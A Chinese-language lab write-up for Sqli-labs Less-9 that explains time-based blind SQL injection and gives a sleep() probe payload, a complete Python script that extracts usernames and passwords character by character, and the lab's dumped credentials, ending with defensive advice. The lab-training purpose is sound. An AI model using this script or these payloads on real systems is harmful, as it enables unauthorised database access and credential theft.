## 题目: Sqli-labs Less-9

## 题目描述
页面提示输入 ID 参数进行查询。本关极其变态，没有任何报错回显，也没有数据回显，甚至连布尔盲注的“正确/错误”页面差异都没有。无论输入什么，页面永远只显示 `You are in...`。

## 解题思路
这是典型的**时间盲注（Time-Based Blind）**。既然页面内容没有任何变化，我们只能通过控制数据库的“执行时间”来判断条件是否成立。
利用 MySQL 的 `sleep()` 函数，配合 `if()` 逻辑判断：如果猜对了字符，就让数据库睡眠 3 秒；猜错了就立即返回。通过 Python 脚本测量请求的耗时，即可实现对数据的逐个字符提取。

## 解题步骤
**1. 探测闭合方式与注入点**
输入 `?id=1' and sleep(3) --+`，如果页面明显卡顿 3 秒才加载，说明单引号闭合有效，且时间盲注可用。

**2. 编写时间盲注 Python 脚本**
利用 `time.time()` 记录请求前后的时间差，结合二分法快速爆破 `users` 表的数据。

**实战 Payload 核心代码**：

```python
import requests
import time

url = "http://127.0.0.1/sqli-labs/Less-9/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

print("开始时间盲注爆破，因为要等待 sleep，所以会有些慢...")

for i in range(1, 150):
    low = 32
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        
        # 核心修改：如果猜的字符大于 mid，就让数据库睡 3 秒
        payload = f"?id=1' and if(ascii(substr({query},{i},1))>{mid},sleep(3),0) --+"
        
        start_time = time.time()
        try:
            r = requests.get(url + payload, timeout=10)
            elapsed_time = time.time() - start_time
        except Exception as e:
            print(f"请求超时或出错: {e}")
            continue
            
        # 核心判断：如果响应时间大于 2.5 秒，说明条件成立（数据库睡眠了）
        if elapsed_time >= 2.5:
            low = mid + 1  # 猜小了，往大了猜
        else:
            high = mid - 1 # 猜大了，往小了猜
            
    if low == 127:
        break
        
    char = chr(low)
    result += char
    print(f"[+] 爆出第 {i} 个字符: {char} | 当前结果: {result}")

print("\n================ 最终结果 ================")
print(result)
print("==========================================")
```
**3. 运行脚本获取数据**
在 CMD 中运行 python less9.py。经过漫长的时间等待，成功利用时间差爆出 users 表的全部敏感信息：
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy...

## 知识点总结
* 时间盲注原理：当页面没有任何回显差异时，利用 sleep() 函数人为制造响应时间差，将查询结果转化为“请求时长”的差异。
* if() 函数：在注入中常用来做逻辑分支，如 if(条件, sleep(3), 0)，如果条件为真则执行睡眠。
* 盲注的取舍：时间盲注是盲注中效率最低、最耗时的。在实战中，如果能用布尔盲注或联合查询，绝不用时间盲注。
* 防御策略：严格限制输入类型；使用 PDO 预编译彻底隔绝注入；对于异常或超长请求进行拦截
